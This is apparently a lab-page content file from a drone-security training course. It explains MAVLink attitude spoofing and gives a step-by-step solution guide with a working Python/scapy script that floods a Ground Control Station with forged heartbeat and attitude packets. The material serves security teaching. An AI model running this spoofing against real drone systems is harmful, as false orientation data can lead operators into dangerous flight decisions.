title: Attitude Spoofing
order: 1
description: Spoofing the drone's attitude data to mislead the Ground Control Station (GCS) about the drone's orientation and movements.
breadcrumb:
  - text: Attack Scenarios
    link: /attacks
  - text: Reconnaissance
  - text: Attitude Spoofing

sections:
  - title: Description
    content: |
      Attitude spoofing involves sending false attitude data (pitch, roll, yaw) to the Ground Control Station 
      (GCS) to mislead it about the drone's actual orientation and movements. This can cause the operator to 
      make incorrect decisions based on the spoofed data.

  - title: Resources
    content:
      - text: MAVLink Protocol
        link: https://mavlink.io/en/
      - text: PyMAVLink Documentation
        link: https://mavlink.io/en/mavgen_python/

  - title: Solution Guide
    collapsible: true
    steps:
      - title: Step 1. Setup
        description: |
          Ensure you have Python and the necessary libraries installed:
          ```sudo apt-get update
          sudo apt-get install python3 python3-pip
          pip3 install pymavlink scapy
          ```

      - title: Step 2. Create the Script
        description: |
          Create a Python script named `attitude-spoofing.py` and paste the following code:
          ```from pymavlink import mavutil
          from scapy.all import *
          import time
          import sys
          import random

          def create_heartbeat():
              """
              Create a MAVLink heartbeat message.
              """
              mav = mavutil.mavlink.MAVLink(None)
              mav.srcSystem = 1
              mav.srcComponent = 1

              heartbeat = mav.heartbeat_encode(
                  type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
                  autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                  base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                  custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
                  system_status=mavutil.mavlink.MAV_STATE_ACTIVE
              )
              
              return heartbeat.pack(mav)

          def create_attitude():
              """
              Create a MAVLink ATTITUDE message with random values.
              """
              mav = mavutil.mavlink.MAVLink(None)
              mav.srcSystem = 1
              mav.srcComponent = 1

              roll = random.uniform(-1.0, 1.0)
              pitch = random.uniform(-1.0, 1.0)
              yaw = random.uniform(-3.14, 3.14)
              rollspeed = random.uniform(-0.1, 0.1)
              pitchspeed = random.uniform(-0.1, 0.1)
              yawspeed = random.uniform(-0.1, 0.1)

              attitude = mav.attitude_encode(
                  time_boot_ms=int(time.time() * 1e3) % 4294967295,  # Time since boot in milliseconds, using modulo to ensure valid range
                  roll=roll,  # Roll angle (rad)
                  pitch=pitch,  # Pitch angle (rad)
                  yaw=yaw,  # Yaw angle (rad)
                  rollspeed=rollspeed,  # Roll angular speed (rad/s)
                  pitchspeed=pitchspeed,  # Pitch angular speed (rad/s)
                  yawspeed=yawspeed  # Yaw angular speed (rad/s)
              )

              return attitude.pack(mav)

          def send_mavlink_packet(packet_data, target_ip, target_port):
              """
              Send a MAVLink packet using Scapy.
              """
              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
              send(packet)

          if __name__ == "__main__":
              if len(sys.argv) != 2:
                  print("Usage: python attitude-spoof.py <ip:port>")
                  sys.exit(1)

              target = sys.argv[1]
              target_ip, target_port = target.split(':')
              target_port = int(target_port)

              while True:
                  heartbeat_packet = create_heartbeat()
                  attitude_packet = create_attitude()

                  send_mavlink_packet(heartbeat_packet, target_ip, target_port)
                  send_mavlink_packet(attitude_packet, target_ip, target_port)
                  
                  print(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")

          ```

      - title: Step 3. Run the Script
        description: |
          Execute the script with sudo and the target GCS IP and port:
          ```sudo python attitude-spoofing.py <ip:port>
          ```
          Replace `<ip:port>` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`

      - title: Step 4. Monitor the Effects
        description: |
          Observe the GCS to see the spoofed attitude data being displayed. The drone's orientation (pitch, roll, yaw) will appear different from its actual state.

